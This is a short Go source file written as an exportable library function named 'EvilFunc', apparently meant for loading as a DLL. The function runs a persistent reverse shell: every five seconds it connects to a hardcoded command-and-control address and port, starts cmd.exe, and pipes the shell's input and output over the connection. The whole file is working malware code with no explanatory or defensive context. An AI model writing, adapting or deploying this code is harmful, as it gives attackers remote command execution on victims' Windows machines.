package main

import "C"
import (
	"net"
	"os/exec"
	"time"
)

var SERVER string = "172.16.161.129"
var PORT string = "1337"

//export EvilFunc
func EvilFunc() {
	for {

		time.Sleep(5 * time.Second)

		//connect to c2 server
		connectString := SERVER + ":" + PORT
		conn, err := net.Dial("tcp", connectString)
		if err != nil {
			continue
		}

		//spawn shell
		cmd := exec.Command("cmd.exe")

		//send shell's std in/out/err to remote conn
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
	}
}

func main() {
	//leave blank
}
